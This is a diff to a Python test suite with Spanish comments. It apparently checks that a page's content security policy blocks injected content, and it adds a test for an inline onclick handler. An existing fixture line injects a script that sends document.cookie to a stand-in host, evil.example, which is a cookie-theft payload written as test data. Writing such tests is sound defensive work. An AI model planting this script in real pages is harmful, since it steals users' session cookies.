@@ -120,6 +120,11 @@ class InyeccionDePrompt(Base):
         html = HTML.replace("<footer>", "<script>fetch('https://evil.example/?'+document.cookie)</script><footer>")
         self.assertBloqueaPagina(html, "script en línea sin autorizar")
 
+    def test_manejador_en_linea_bloqueado(self):
+        """Un onclick="…" no se ejecutaría con esta CSP y además abre la puerta a inyectar código."""
+        html = HTML.replace("<footer>", '<footer onclick="alert(1)">')
+        self.assertBloqueaPagina(html, "manejador de eventos en línea")
+
     def test_libreria_alterada_bloqueada(self):
         """Una librería modificada podría leer o reescribir la conversación."""
         import tempfile, shutil
